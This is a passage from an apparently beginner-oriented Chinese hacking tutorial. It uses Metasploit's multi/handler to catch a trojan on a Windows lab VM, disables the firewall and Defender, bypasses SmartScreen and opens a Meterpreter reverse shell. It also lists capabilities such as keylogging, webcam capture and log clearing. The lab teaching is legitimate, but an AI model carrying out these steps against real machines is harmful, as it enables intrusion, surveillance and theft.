

3. 输入 Kali 虚拟机的 IP 地址，以指示连接将从中进入的本地主机（请记住填写最后一个数字）：

```
msf6 exploit(multi/handler) > set LHOST 10.0.9.x
```

Metasploit 将响应 `LHOST => 10.0.9.x`，以指示本地主机选项已正确设置。

4. 最后，我们等待的时刻到了：启动漏洞利用！

```
msf6 exploit(multi/handler) > exploit -j 
```

`-j` 选项告诉 Metasploit 在后台运行处理程序，以便你在等待受感染机器连接到 Kali 虚拟机时可以使用 msfconsole。Metasploit 将确认漏洞利用正在后台运行，准备在 `10.0.9.x:4444`（即 Kali 虚拟机上的 4444 端口）上接受传入连接。

## 感染你的 Windows 虚拟机

我们的木马已准备就绪。现在是时候感染你的 Windows 虚拟机了。首先，我们将禁用几个 Windows 安全功能，这些功能通常会使用户更难做出诸如从互联网下载并打开可疑文件之类的愚蠢行为。然后，在关闭这些防护措施后，我们就要做的正是这种愚蠢的事情。

请记住，你的 Windows 虚拟机是为你安全地练习黑客技术而创建的。如果你把它搞砸了，例如感染了木马，你可以简单地删除 Windows 虚拟机并创建一个新的。考虑到这一点，在 VirtualBox 中启动你的 Windows 10 虚拟机，如果提示，请输入用户名 `IEUser` 和密码 `Passw0rd!`，让我们开始吧。

1. 在 Windows/Cortana 搜索栏中输入 `cmd` 以查找命令提示符。右键单击它并选择 **以管理员身份运行**。在弹出的询问是否允许此应用对设备进行更改的窗口中，单击 **是**。

2. 在出现的“管理员：命令提示符”窗口中，输入以下命令以关闭 Windows 虚拟机的防火墙：

```
C:\Windows\system32> netsh advfirewall set allprofiles state off
```

通常，`firewall` 会阻止来自外部计算机的不需要或恶意的流量，并可以防止你的计算机与恶意服务器建立可疑连接。运行此命令后，你可能会看到弹出消息“打开 Windows 防火墙”。Windows 正在警告你，关闭防火墙是危险的——确实如此！——但这正是我们想要的，用于这次首次远程黑客攻击。

3. 接下来，我们将关闭 Windows Defender，另一种安全工具。在搜索栏中输入 `virus` 并打开 **病毒和威胁防护** 设置。

4. 单击 **管理设置**，并将实时保护和云传递保护的切换按钮滑动到 **关闭**。Windows 会再次询问你是否允许此应用对设备进行更改。单击 **是**。你的 Windows 10 虚拟机现在和地球上四分之一的电脑一样脆弱。

5. 打开 Edge 网络浏览器并访问 `http://<10.0.9.x>/share/`。

6. 单击你的木马并选择 **保存** 以将文件下载到 Windows 虚拟机的 `Downloads` 文件夹。

7. 真相大白：打开 Windows 虚拟机的 `Downloads` 文件夹并双击木马可执行文件来运行它。

8. 结果发现，Windows 10 电脑还有一层病毒防护，用于防止像我们刚才犯的那种愚蠢错误：Windows Defender SmartScreen 会弹出警告，称它“阻止了未识别的应用程序启动”，如 [图 6-4](#c06.xhtml#figure6-4) 所示。单击 **更多信息**，然后单击 **仍要运行**。

你现在已经控制了你的第一台计算机！你在 Windows 虚拟机上看不到任何事情发生，但如果你切换回 Kali 虚拟机，应该会在 msfconsole 中看到类似以下的内容：

```
[*] Sending stage (179779 bytes) to 10.0.9.5
[*] Meterpreter session 1 opened (10.0.9.4:4444 -> 10.0.9.5:49830) at 2021-06-11 12:39:46 -0400
```

受感染的 Windows 虚拟机已回连 Kali 并建立了连接（也称为 `session`）。恭喜：Windows 虚拟机现在正在等待你的命令！

![图 6-4：Windows Defender SmartScreen 最后一次尝试保护你的 Windows 虚拟机。](image_fi/502000c06/f06004a.png)

图 6-4：Windows Defender SmartScreen 最后一次尝试保护你的 Windows 虚拟机。

## 使用 Meterpreter 控制你的 Windows 虚拟机

现在，我们已经在 Kali 和 Windows 虚拟机之间建立了连接，准备好从 Metasploit 开始操纵 Windows 机器。首先，在 Metasploit 终端窗口中输入 `sessions` 以查看活动 Metasploit 连接列表：

```
msf6 exploit(multi/handler) > sessions
Active sessions
=============== Id  Name  Type                     Information                       Connection --  ----  ----                     -----------                       ---------- 1         meterpreter x86/windows  MSEDGEWIN10\IEUser @ MSEDGEWIN10  10.0.9.4:4444 -> 10.0.9.5:63750 (10.0.9.5)
```

如你所见，我们已连接到名为 MSEdgeWin10 的受感染 Windows 10 机器，用户名为 `IEUser`——这就是你的 Windows 10 虚拟机！我们的会话 ID 号为 1。如果你在其他机器上也运行了木马，你会看到列出多个会话，每个会话都有自己的 ID 号。同样，如果你需要与 Windows 虚拟机重新建立连接，它将以不同的 ID 号列出，例如 2。

输入 `sessions -i 1` 以开始与 Windows 虚拟机交互：

```
msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

命令提示符会更改为 `meterpreter >`，以指示我们正在与远程 Windows 虚拟机上的 Meterpreter shell 交互。让我们尝试几个命令。输入 `sysinfo` 以查看有关计算机的一些信息，例如其操作系统 (OS)、系统语言等：

```
meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (Build 17763).--snip--
```

现在让我们尝试另一个命令，`pwd`，即 `print working directory` 的缩写，以查看 Meterpreter shell 正在从哪个位置运行：

```
meterpreter > pwd
C:\Users\IEUser\Downloads
```

这告诉我们，Meterpreter shell 正在从 Windows 虚拟机的 `Downloads` 目录运行——也就是我们的木马所在的位置。

输入 `help` 以列出你可以从 Meterpreter shell 远程在 Windows 虚拟机上运行的一些最常用命令。有运行程序、终止运行进程、关闭或重启远程计算机、清除事件日志（以在黑客攻击时掩盖痕迹）、捕获按键、截屏、监视远程用户的桌面或网络摄像头的命令，仅举几例。总共有超过 100 个命令，攻击者可以使用这些命令几乎完全控制一台计算机。这些命令的部分列表显示在 [图 6-5](#c06.xhtml#figure6-5)。

为了了解威胁有多严重，让我们看看攻击者通过受感染文件黑客攻击我们的文件、键盘、网络摄像头等有多容易。我们使用的每个命令并不一定每次尝试都会成功；你可能需要多次尝试。然而，探索这些命令可能造成的损害应该激励你 `never` 不要从随机网页或电子邮件附件安装软件。

![图 6-5：我们可以用来控制受感染 Windows 虚拟机的一系列令人毛骨悚然的酷炫 Meterpreter 命令](image_fi/502000c06/f06005a.png)

图 6-5：我们可以用来控制受感染 Windows 虚拟机的一系列令人毛骨悚然的酷炫 Meterpreter 命令

### 查看和上传文件

我们将通过浏览计算机的文件并将木马的备份副本上传到 Windows 虚拟机，开始对 Windows 虚拟机的利用。

1. 在 `meterpreter >` 命令提示符下，输入以下命令以将目录更改为受感染虚拟机的 `Documents` 文件夹并列出文件夹内容：

